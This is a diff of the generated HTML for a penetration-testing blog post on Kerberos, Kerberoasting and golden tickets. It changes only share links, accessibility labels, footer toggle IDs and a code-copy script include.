-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="reddit">
       <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
-      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
-      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e" aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&t=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&t=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Hacker News">
       <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
     </a>
   </li>
@@ -703,13 +685,13 @@ Ticket(s) purge for current session is OK
 
     <div id="actions-footer">
       
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
           <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
           <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
           <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
           <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
 
@@ -745,6 +727,7 @@ Ticket(s) purge for current session is OK
 <link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
 <script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
 <script src=https://leonjza.github.io/js/main.js></script>
+<script src=https://leonjza.github.io/js/code-copy.js></script>
 
 
 
